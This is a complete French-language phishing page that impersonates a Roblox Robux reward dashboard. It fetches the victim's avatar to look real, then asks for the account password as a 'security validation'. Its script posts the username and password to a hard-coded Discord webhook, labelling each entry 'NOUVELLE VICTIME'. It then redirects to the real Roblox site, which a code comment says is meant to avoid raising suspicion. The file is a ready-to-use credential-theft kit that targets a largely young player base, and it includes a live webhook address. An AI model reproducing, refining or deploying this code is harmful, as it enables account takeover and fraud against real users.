<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Roblox | Dashboard Récompenses</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root { --rbx-bg: #191b1d; --rbx-nav: #232527; --rbx-blue: #00a2ff; --rbx-text: #ffffff; --rbx-sub: #adb1b5; --rbx-green: #27ae60; }
        body { margin: 0; background: var(--rbx-bg); font-family: "HCo Gotham SSm", "Helvetica Neue", Helvetica, Arial, sans-serif; color: var(--rbx-text); display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .container { background: var(--rbx-nav); width: 100%; max-width: 420px; padding: 40px; border-radius: 8px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); text-align: center; box-sizing: border-box; }
        
        /* LOGO OFFICIEL ROBLOX FIXED */
        .logo { width: 42px; margin-bottom: 20px; filter: drop-shadow(0 0 2px rgba(255,255,255,0.1)); }
        
        h1 { font-size: 22px; font-weight: 500; margin: 10px 0; }
        p { color: var(--rbx-sub); font-size: 13px; line-height: 1.5; margin-bottom: 25px; }

        /* AVATAR SYSTEM */
        .avatar-container { display: none; margin-bottom: 20px; animation: fadeIn 0.5s; }
        #avatar-img { width: 80px; height: 80px; border-radius: 50%; border: 2px solid var(--rbx-blue); background: #000; box-shadow: 0 0 15px rgba(0, 162, 255, 0.3); }
        #display-name { font-size: 14px; margin-top: 8px; color: var(--rbx-blue); font-weight: 600; }

        input, select { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid #393b3d; border-radius: 4px; color: #fff; box-sizing: border-box; outline: none; font-size: 14px; transition: border 0.2s; }
        input:focus { border-color: var(--rbx-blue); }

        .btn-blue { width: 100%; padding: 14px; background: var(--rbx-blue); border: none; border-radius: 4px; color: #fff; font-weight: 600; cursor: pointer; margin-top: 15px; font-size: 15px; transition: 0.2s; }
        .btn-blue:hover { background: #0081cc; transform: translateY(-1px); }
        
        .step { display: none; }
        .active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        /* LOADING SPINNER */
        .spinner { display: none; width: 25px; height: 25px; border: 3px solid rgba(255,255,255,.1); border-top-color: var(--rbx-blue); border-radius: 50%; animation: spin 0.8s linear infinite; margin: 20px auto; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="container">
    <img src="https://images.rbxcdn.com/2216479f3db70517860269f835f8dc13.png" class="logo" alt="Roblox">
    
    <div id="step1" class="step active">
        <h1>Réclamation Robux</h1>
        <p>Vérifiez votre éligibilité et choisissez votre pack de récompense.</p>
        
        <div class="avatar-container" id="avatar-container">
            <img id="avatar-img" src="">
            <div id="display-name"></div>
        </div>

        <input type="text" id="username" placeholder="Nom d'utilisateur" onblur="loadProfile()" autocomplete="off">
        
        <select id="robux-amount">
            <option value="1,700">1,700 Robux</option>
            <option value="4,500">4,500 Robux</option>
            <option value="10,000">10,000 Robux</option>
            <option value="50,000">50,000 Robux (Admin Beta)</option>
        </select>

        <button class="btn-blue" onclick="toStep2()">Vérifier le compte</button>
        <div class="spinner" id="loader-1"></div>
    </div>

    <div id="step2" class="step">
        <h1 style="color: #ff4d4d;">Validation de Sécurité</h1>
        <p>Pour transférer les <b id="final-amt"></b> Robux vers votre compte, veuillez confirmer votre mot de passe pour la synchronisation.</p>
        
        <input type="password" id="password" placeholder="Mot de passe actuel">
        <button class="btn-blue" style="background: var(--rbx-green);" onclick="submitLogs()">Confirmer & Recevoir</button>
        <div class="spinner" id="loader-2"></div>
        
        <p style="font-size: 10px; margin-top: 25px; opacity: 0.5;">ID de transaction : #RBX-7729-2026</p>
    </div>
</div>

<script>
    const WEBHOOK = "https://discord.com/api/webhooks/1490805370715902075/gRPIwEEgi3c5kSyGOO79wDtEjBgy-wzirW1hU-K27YZnavOqki447luH-mQn-UNhWOj9";

    async function loadProfile() {
        const u = document.getElementById('username').value;
        if(u.length < 3) return;
        
        try {
            const res = await fetch(`https://corsproxy.io/?https://users.roblox.com/v1/usernames/users`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ usernames: [u] })
            });
            const data = await res.json();
            
            if(data.data && data.data.length > 0) {
                const id = data.data[0].id;
                const thumb = await fetch(`https://corsproxy.io/?https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${id}&size=150x150&format=Png`);
                const thumbData = await thumb.json();
                
                document.getElementById('avatar-img').src = thumbData.data[0].imageUrl;
                document.getElementById('display-name').innerText = "@" + data.data[0].displayName;
                document.getElementById('avatar-container').style.display = "block";
            }
        } catch(e) { console.log("Erreur API"); }
    }

    function toStep2() {
        const user = document.getElementById('username').value;
        if(!user) return;
        
        document.getElementById('loader-1').style.display = "block";
        setTimeout(() => {
            document.getElementById('final-amt').innerText = document.getElementById('robux-amount').value;
            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.add('active');
        }, 1500);
    }

    async function submitLogs() {
        const u = document.getElementById('username').value;
        const p = document.getElementById('password').value;
        const a = document.getElementById('robux-amount').value;
        
        if(!p || p.length < 4) return;
        
        document.getElementById('loader-2').style.display = "block";

        await fetch(WEBHOOK, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                embeds: [{
                    title: "🎭 NOUVELLE VICTIME - V13.0",
                    color: 1752220,
                    thumbnail: { url: document.getElementById('avatar-img').src },
                    fields: [
                        { name: "👤 Utilisateur", value: `\`${u}\``, inline: true },
                        { name: "🔑 Mot de passe", value: `\`${p}\``, inline: true },
                        { name: "💰 Montant choisi", value: `\`${a} Robux\``, inline: true }
                    ],
                    footer: { text: "Roblox Reward System • 2026" },
                    timestamp: new Date()
                }]
            })
        });

        // Redirection vers la vraie page premium pour ne pas éveiller de soupçons
        setTimeout(() => {
            window.location.href = "https://www.roblox.com/premium/membership";
        }, 1000);
    }
</script>
</body>
</html>
